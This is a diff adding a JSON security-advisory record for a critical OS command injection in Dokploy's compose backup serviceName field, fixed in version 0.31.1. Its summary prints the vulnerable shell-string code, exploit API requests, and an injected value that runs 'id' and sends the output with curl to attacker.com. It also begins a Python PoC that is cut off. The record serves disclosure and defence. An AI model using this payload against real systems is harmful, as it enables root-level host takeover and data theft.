@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-j329-jw7j-rxjm",
+  "aliases": [],
+  "title": "OS Command Injection via serviceName in Compose Backup",
+  "summary": "## Summary\r\n\r\nThe serviceName field accepted by backup.create and backup.update is interpolated directly into a shell command string without sanitization or escaping. The injected command executes as root inside the Dokploy container at the next scheduled cron tick (default: every minute). Because Dokploy mounts /var/run/docker.sock on standard installations, this leads to full host compromise.\r\n\r\nCritically, exploitation requires only a member-level account - no admin or owner privileges are needed. A member with access to a single project can create a backup with an injected serviceName targeting any destination already registered in the organization.\r\n\r\n\r\n## Root Cause\r\n\r\npackages/server/src/utils/backups/utils.ts, function getComposeContainerCommand (lines 246-256), interpolates serviceName directly into a shell string:\r\n\r\n```javascrip\r\nexport const getComposeContainerCommand = (\r\n  appName: string,\r\n  serviceName: string,\r\n  composeType: \"stack\" | \"docker-compose\" | undefined,\r\n) => {\r\n  // serviceName is never validated or shell-escaped\r\n  return `docker ps -q --filter \"status=running\" \\\r\n--filter \"label=com.docker.compose.project=${appName}\" \\\r\n--filter \"label=com.docker.compose.service=${serviceName}\" | head -n 1`;\r\n};\r\n```\r\n\r\nThe backup executes via execAsync(backupCommand, { shell: \"/bin/bash\" }). The schedule defaults to */1 * * * *, so the payload executes within 60 seconds of creation.\r\n\r\nThe Zod schema for backup.create applies z.string() to serviceName with no regex or character restriction, while other shell-adjacent fields in the same schema (appName, additionalFlags) are guarded by strict validators.\r\n\r\n\r\n## Proof of Concept\r\n\r\nPrerequisites: A Dokploy instance, any member-level account with access to at least one project, and an existing destinationId (no credential access needed - just the ID).\r\n\r\nStep 1 - Sign in as a low-privilege member:\r\n\r\n```bash\r\nPOST /api/auth/sign-in/email\r\n{\"email\": \"member@example.com\", \"password\": \"...\"}\r\n```\r\n\r\nStep 2 - Create or use an existing compose app in an accessible project:\r\n\r\n```bash\r\nPOST /api/trpc/compose.create\r\n{\"json\": {\"name\": \"poc-app\", \"appName\": \"poc-app\",\r\n           \"composeType\": \"docker-compose\", \"environmentId\": \"<envId>\"}}\r\n```\r\n\r\nStep 3 - Create a backup with an injected serviceName:\r\n\r\n```bash\r\nPOST /api/trpc/backup.create\r\n{\"json\": {\r\n  \"backupType\":    \"compose\",\r\n  \"composeId\":     \"<composeId>\",\r\n  \"destinationId\": \"<any valid destinationId>\",\r\n  \"serviceName\":   \"svc\\\" ; OUTPUT=$(id) ; curl -sk --data \\\"$OUTPUT\\\" https://attacker.com/collect ; echo \\\"\",\r\n  \"schedule\":      \"*/1 * * * *\",\r\n  \"enabled\":       true,\r\n  \"prefix\":        \"poc\",\r\n  \"database\":      \"poc\",\r\n  \"databaseType\":  \"postgres\"\r\n}}\r\n```\r\n```bash\r\nResponse: HTTP 200 {\"json\": null} - accepted without validation.\r\n```\r\n\r\nStep 4 - Wait up to 60 seconds. The attacker's server receives:\r\n\r\n```bash\r\nuid=0(root) gid=0(root) groups=0(root)\r\n```\r\n\r\n## A self-contained Python PoC\r\n\r\n```python\r\n#!/usr/bin/env python3\r\n\"\"\"\r\nDokploy OS Command Injection via serviceName in Compose Backup\r\nCWE-78 | packages/server/src/utils/backups/utils.ts:137\r\n\r\nAttack chain:\r\n1. Sign in (better-auth)\r\n2. Create project + compose app\r\n3. Create S3 destination (fake creds - injection fires before S3 connection)\r\n4. Create backup with malicious serviceName → shell metacharacters not sanitized\r\n5. Cron fires every 60s → injected command executes as root inside container\r\n\"\"\"\r\n\r\nimport argparse\r\nimport getpass\r\nimport sys\r\nimport time\r\n\r\nimport requests\r\n\r\nWEBHOOK = \"https://webhook.site/4951b86c-aac1-444a-877d-df9073a515e6\"\r\n\r\n\r\ndef parse_args():\r\n    p = argparse.ArgumentParser(\r\n        description=\"Dokploy serviceName RCE PoC (CWE-78)\"\r\n    )\r\n    p.add_argument(\"--url\",      default=\"http://localhost:3001\",\r\n                   help=\"Dokploy base URL (default: http://localhost:3001)\")\r\n    p.add_argument(\"--email\",    default=None,\r\n                   help=\"Dokploy account email\")\r\n    p.add_argument(\"--pa...",
+  "published_at": "2026-11-12T08:16:28.000Z",
+  "modified_at": "2026-11-12T15:09:51.000Z",
+  "severity": {
+    "level": "critical",
+    "score": 9.9,
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-78"
+  ],
+  "affected": [
+    {
+      "product": "dokploy",
+      "ranges": [
+        {
+          "introduced": "0",
+          "fixed": "0.31.1"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-j329-jw7j-rxjm",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-j329-jw7j-rxjm",
+      "url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-j329-jw7j-rxjm",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:1070f40e026def1b060677616a46bba3ef4fe6f1264f7bc538631bab2f64ce97",
+  "note": null
+}
